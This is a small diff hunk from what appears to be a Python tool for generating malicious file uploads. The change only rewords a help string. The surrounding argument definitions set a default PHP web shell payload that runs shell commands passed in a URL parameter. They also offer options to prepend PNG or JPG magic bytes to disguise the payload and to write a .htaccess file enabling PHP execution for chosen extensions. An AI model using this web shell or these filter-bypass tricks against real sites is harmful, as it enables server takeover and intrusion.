@@ -70,7 +70,7 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--payload', help='The payload in the files', default='<?php system($_GET["cmd"]); ?>',metavar='<payload>')
     parser.add_argument('-f', '--file', help='The type of the files', default='php', choices=['php'])
     parser.add_argument('-ext', '--extension', help='Generate the payload with specific extension',metavar='<ext>')
-    parser.add_argument('-b', '--bypass', action='store_true', help='Bypass the restriction')
+    parser.add_argument('-b', '--bypass', action='store_true', help='Generate some payload to bypass the restriction')
     parser.add_argument('-n', '--name', help='Name of the file', default='payload',metavar='<name>')
     parser.add_argument('-m', '--magic', help='Magic Header, add the magics numbers before the payload', choices=['png', 'jpg'])
     parser.add_argument('-ht', '--htaccess', help='Creates in addition a .htaccess file, which allow execution of php whith extension that you have chosen',metavar='<ext>')
